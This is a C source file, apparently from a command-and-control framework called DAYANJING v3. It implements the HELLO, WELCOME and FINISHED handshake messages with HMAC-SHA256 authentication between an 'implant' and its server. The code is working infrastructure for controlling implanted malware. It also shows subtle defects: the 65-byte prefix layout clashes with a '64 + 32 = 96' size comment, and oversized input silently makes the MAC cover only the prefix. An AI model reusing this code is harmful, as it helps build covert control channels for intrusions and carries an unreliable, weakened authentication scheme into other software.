/*
 * DAYANJING v3 — c2_hsmsg.c
 *
 * 握手报文层实现。契约见 include/c2_hsmsg.h。
 * 密码学只依赖 00_crypto 的 HMAC-SHA256 / SHA-256，不自研第二套。
 */

#include "c2_hsmsg.h"
#include "crypto_hash.h"
#include <string.h>

/* ---- 小端读写（不依赖平台字节序） ---- */
static void put_u32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)v; p[1] = (uint8_t)(v >> 8);
    p[2] = (uint8_t)(v >> 16); p[3] = (uint8_t)(v >> 24);
}
static uint32_t get_u32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}
static void put_u64be(uint8_t *p, uint64_t v) {
    for (int i = 0; i < 8; i++) p[i] = (uint8_t)(v >> (56 - 8 * i));
}
static uint64_t get_u64be(const uint8_t *p) {
    uint64_t v = 0;
    for (int i = 0; i < 8; i++) v = (v << 8) | p[i];
    return v;
}

/* MAC 比较：常数时间，避免早退泄露比较位置 */
static int ct_eq(const uint8_t *a, const uint8_t *b, size_t n) {
    uint8_t d = 0;
    for (size_t i = 0; i < n; i++) d |= (uint8_t)(a[i] ^ b[i]);
    return d == 0;
}

static const uint8_t LABEL_SRV[] = "dayanjing-hs-server";
static const uint8_t LABEL_CLI[] = "dayanjing-hs-client";

/* ====================================================================
 * HELLO
 * ==================================================================== */

int c2_hsmsg_encode_hello(uint8_t *out, size_t cap, size_t *len,
                          uint32_t version, uint32_t suite,
                          const char *implant_id,
                          const uint8_t cnonce[C2_HS_NONCE_LEN]) {
    if (!len) return C2_ERR_ARG;
    if (!cnonce) return C2_ERR_ARG;

    size_t id_len = implant_id ? strlen(implant_id) : 0;
    if (id_len > C2_HS_IMPLANT_MAX) return C2_ERR_LEN;

    size_t total = 1 + 4 + 4 + 1 + id_len + C2_HS_NONCE_LEN;
    *len = total;
    if (!out) return C2_OK;
    if (cap < total) return C2_ERR_LEN;

    out[0] = C2_HSMSG_HELLO;
    put_u32(out + 1, version);
    put_u32(out + 5, suite);
    out[9] = (uint8_t)id_len;
    if (id_len) memcpy(out + 10, implant_id, id_len);
    memcpy(out + 10 + id_len, cnonce, C2_HS_NONCE_LEN);
    return C2_OK;
}

int c2_hsmsg_decode_hello(const uint8_t *in, size_t len,
                          uint32_t *version, uint32_t *suite,
                          char *implant_id, size_t id_cap,
                          uint8_t cnonce[C2_HS_NONCE_LEN]) {
    if (!in || !cnonce) return C2_ERR_ARG;
    if (len < 1 + 4 + 4 + 1 + C2_HS_NONCE_LEN) return C2_ERR_LEN;
    if (in[0] != C2_HSMSG_HELLO) return C2_ERR_LEN;

    size_t id_len = in[9];
    if (id_len > C2_HS_IMPLANT_MAX) return C2_ERR_LEN;
    if (len != 10 + id_len + C2_HS_NONCE_LEN) return C2_ERR_LEN;
    if (implant_id && id_cap > 0 && id_cap < id_len + 1) return C2_ERR_LEN;

    if (version) *version = get_u32(in + 1);
    if (suite)   *suite   = get_u32(in + 5);
    if (implant_id && id_cap > 0) {
        memcpy(implant_id, in + 10, id_len);
        implant_id[id_len] = '\0';
    }
    memcpy(cnonce, in + 10 + id_len, C2_HS_NONCE_LEN);
    return C2_OK;
}

/* ====================================================================
 * WELCOME
 * ==================================================================== */

/* prefix(65) = type(1) || version(4) || suite(4) || snonce(32) || server_static_id(16) || generation(8 BE) */
static void build_welcome_prefix(uint8_t *p, uint32_t version, uint32_t suite,
                                 const uint8_t snonce[C2_HS_NONCE_LEN],
                                 const uint8_t sid[C2_SERVER_ID_LEN],
                                 uint64_t generation) {
    p[0] = C2_HSMSG_WELCOME;
    put_u32(p + 1, version);
    put_u32(p + 5, suite);
    memcpy(p + 9, snonce, C2_HS_NONCE_LEN);
    memcpy(p + 41, sid, C2_SERVER_ID_LEN);
    put_u64be(p + 57, generation);
}

/* server_mac = HMAC(k_identity, LABEL_SRV || hello || welcome_prefix) */
static void welcome_mac(const uint8_t k_identity[C2_KEY_LEN],
                        const uint8_t *hello, size_t hello_len,
                        const uint8_t *prefix,
                        uint8_t out[C2_HS_MAC_LEN]) {
    /* label||hello||prefix 拼接到固定缓冲；hello 受 implant_id<=63 约束，
       实际需求约 124B，4KB 足够。超限时退化为仅 prefix（长度异常由上层挡住）。 */
    uint8_t msg[4096];
    size_t ml = 0;
    size_t cap = (sizeof(LABEL_SRV) - 1) + hello_len + C2_HS_WELCOME_PREFIX;
    if (cap > sizeof msg) {
        /* hello 过长：退化为仅对 prefix 计算（长度异常会被上层长度校验挡住） */
        hmac_sha256(k_identity, C2_KEY_LEN, prefix, C2_HS_WELCOME_PREFIX, out);
        return;
    }
    memcpy(msg, LABEL_SRV, sizeof(LABEL_SRV) - 1);
    ml += sizeof(LABEL_SRV) - 1;
    if (hello && hello_len) { memcpy(msg + ml, hello, hello_len); ml += hello_len; }
    memcpy(msg + ml, prefix, C2_HS_WELCOME_PREFIX); ml += C2_HS_WELCOME_PREFIX;

    hmac_sha256(k_identity, C2_KEY_LEN, msg, ml, out);
}

int c2_hsmsg_encode_welcome(uint8_t *out, size_t cap, size_t *len,
                            uint32_t version, uint32_t suite,
                            const uint8_t snonce[C2_HS_NONCE_LEN],
                            const uint8_t server_static_id[C2_SERVER_ID_LEN],
                            uint64_t generation,
                            const uint8_t k_identity[C2_KEY_LEN],
                            const uint8_t *hello, size_t hello_len) {
    if (!len || !snonce || !server_static_id || !k_identity) return C2_ERR_ARG;

    size_t total = C2_HS_WELCOME_PREFIX + C2_HS_MAC_LEN;   /* 64 + 32 = 96 */
    *len = total;
    if (!out) return C2_OK;
    if (cap < total) return C2_ERR_LEN;

    uint8_t prefix[C2_HS_WELCOME_PREFIX];
    build_welcome_prefix(prefix, version, suite, snonce, server_static_id, generation);
    memcpy(out, prefix, C2_HS_WELCOME_PREFIX);
    welcome_mac(k_identity, hello, hello_len, prefix, out + C2_HS_WELCOME_PREFIX);
    return C2_OK;
}

int c2_hsmsg_decode_welcome(const uint8_t *in, size_t len,
                            uint32_t *version, uint32_t *suite,
                            uint8_t snonce[C2_HS_NONCE_LEN],
                            uint8_t server_static_id[C2_SERVER_ID_LEN],
                            uint64_t *generation,
                            const uint8_t k_identity[C2_KEY_LEN],
                            const uint8_t *hello, size_t hello_len) {
    if (!in || !snonce || !server_static_id || !generation || !k_identity)
        return C2_ERR_ARG;
    if (len != C2_HS_WELCOME_PREFIX + C2_HS_MAC_LEN) return C2_ERR_LEN;
    if (in[0] != C2_HSMSG_WELCOME) return C2_ERR_LEN;

    uint8_t expect[C2_HS_MAC_LEN];
    welcome_mac(k_identity, hello, hello_len, in, expect);
    if (!ct_eq(expect, in + C2_HS_WELCOME_PREFIX, C2_HS_MAC_LEN))
        return C2_ERR_AUTH;      /* 伪造服务端 / 报文被篡改：不输出任何字段 */

    *version = get_u32(in + 1);
    *suite   = get_u32(in + 5);
    memcpy(snonce, in + 9, C2_HS_NONCE_LEN);
    memcpy(server_static_id, in + 41, C2_SERVER_ID_LEN);
    *generation = get_u64be(in + 57);
    return C2_OK;
}

/* ====================================================================
 * FINISHED
 * ==================================================================== */

/* client_mac = HMAC(k_identity, LABEL_CLI || hello || welcome || finished_prefix) */
static void finished_mac(const uint8_t k_identity[C2_KEY_LEN],
                         const uint8_t *hello, size_t hello_len,
                         const uint8_t *welcome, size_t welcome_len,
                         const uint8_t *prefix,
                         uint8_t out[C2_HS_MAC_LEN]) {
    /* 同上：拼接到固定 4KB 缓冲；超限时退化为仅 prefix（长度异常由上层挡住） */
    uint8_t msg[4096];
    size_t ml = 0;
    size_t need = (sizeof(LABEL_CLI) - 1) + hello_len + welcome_len +
                  C2_HS_FINISHED_PREFIX;
    if (need > sizeof msg) {
        hmac_sha256(k_identity, C2_KEY_LEN, prefix, C2_HS_FINISHED_PREFIX, out);
        return;
    }
    memcpy(msg, LABEL_CLI, sizeof(LABEL_CLI) - 1);
    ml += sizeof(LABEL_CLI) - 1;
    if (hello && hello_len) { memcpy(msg + ml, hello, hello_len); ml += hello_len; }
    if (welcome && welcome_len) { memcpy(msg + ml, welcome, welcome_len); ml += welcome_len; }
    memcpy(msg + ml, prefix, C2_HS_FINISHED_PREFIX);
    ml += C2_HS_FINISHED_PREFIX;
    hmac_sha256(k_identity, C2_KEY_LEN, msg, ml, out);
}

int c2_hsmsg_encode_finished(uint8_t *out, size_t cap, size_t *len,
                             uint32_t version, uint32_t suite,
                             const uint8_t k_identity[C2_KEY_LEN],
                             const uint8_t *hello, size_t hello_len,
                             const uint8_t *welcome, size_t welcome_len) {
    if (!len || !k_identity) return C2_ERR_ARG;

    size_t total = C2_HS_FINISHED_PREFIX + C2_HS_MAC_LEN;  /* 8 + 32 = 40 */
    *len = total;
    if (!out) return C2_OK;
    if (cap < total) return C2_ERR_LEN;

    uint8_t prefix[C2_HS_FINISHED_PREFIX];
    prefix[0] = C2_HSMSG_FINISHED;
    put_u32(prefix + 1, version);
    put_u32(prefix + 5, suite);
    memcpy(out, prefix, C2_HS_FINISHED_PREFIX);
    finished_mac(k_identity, hello, hello_len, welcome, welcome_len, prefix,
                 out + C2_HS_FINISHED_PREFIX);
    return C2_OK;
}

int c2_hsmsg_decode_finished(const uint8_t *in, size_t len,
                             uint32_t *version, uint32_t *suite,
                             const uint8_t k_identity[C2_KEY_LEN],
                             const uint8_t *hello, size_t hello_len,
                             const uint8_t *welcome, size_t welcome_len) {
    if (!in || !k_identity) return C2_ERR_ARG;
    if (len != C2_HS_FINISHED_PREFIX + C2_HS_MAC_LEN) return C2_ERR_LEN;
    if (in[0] != C2_HSMSG_FINISHED) return C2_ERR_LEN;

    uint8_t expect[C2_HS_MAC_LEN];
    finished_mac(k_identity, hello, hello_len, welcome, welcome_len, in, expect);
    if (!ct_eq(expect, in + C2_HS_FINISHED_PREFIX, C2_HS_MAC_LEN))
        return C2_ERR_AUTH;      /* 伪造客户端 / 报文被篡改 */

    if (version) *version = get_u32(in + 1);
    if (suite)   *suite   = get_u32(in + 5);
    return C2_OK;
}

/* ====================================================================
 * transcript
 * ==================================================================== */

void c2_hsmsg_transcript(const uint8_t *hello, size_t hello_len,
                         const uint8_t *welcome, size_t welcome_len,
                         const uint8_t *fin_prefix, size_t fin_len,
                         uint8_t out[C2_TRANSCRIPT_LEN]) {
    sha256_ctx c;
    sha256_init(&c);
    if (hello && hello_len) sha256_update(&c, hello, hello_len);
    if (welcome && welcome_len) sha256_update(&c, welcome, welcome_len);
    if (fin_prefix && fin_len) sha256_update(&c, fin_prefix, fin_len);
    sha256_final(&c, out);
}

int c2_hsmsg_type(const uint8_t *in, size_t len) {
    if (!in || len < 1) return -1;
    return in[0];
}
